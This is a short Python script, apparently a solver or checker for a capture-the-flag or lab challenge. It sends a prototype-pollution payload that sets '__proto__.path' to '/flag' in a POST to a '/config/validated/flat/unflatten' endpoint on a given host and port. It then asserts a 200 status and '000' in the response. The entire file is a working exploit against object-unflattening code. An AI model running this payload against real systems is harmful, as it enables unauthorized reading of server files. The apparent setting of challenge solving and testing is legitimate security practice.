#!/usr/bin/env python3

import sys
import urllib.request
import urllib.parse

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])
    url = f'http://{host}:{port}'

    path = "config"
    data = urllib.parse.urlencode({ "__proto__.path": "/flag" })
    data = data.encode('ascii')

    with urllib.request.urlopen(f'{url}/{path}/validated/flat/unflatten', data) as response:
      rsp_text = response.read().decode('ascii').strip()
    print(rsp_text)
    assert response.code == 200
    assert "000" in rsp_text

    sys.exit(0)


if __name__ == '__main__':
    main()